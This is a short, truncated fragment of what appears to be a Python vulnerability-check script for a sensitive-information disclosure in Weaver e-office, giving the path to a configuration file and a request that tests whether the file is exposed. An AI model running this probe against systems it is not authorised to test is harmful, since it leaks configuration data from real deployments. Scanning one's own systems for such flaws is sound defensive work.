...
# 漏洞payload
payload=r"/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini"
# building/config/config.ini
# 漏洞名称
vul_name="泛微e-office系统敏感信息泄露"
...
def send_request(url):
    try:   
        response=requests.post(f"{url}{payload}",timeout=10,verify=False)
        if response.status_code==200 and 'sip' in response.text:
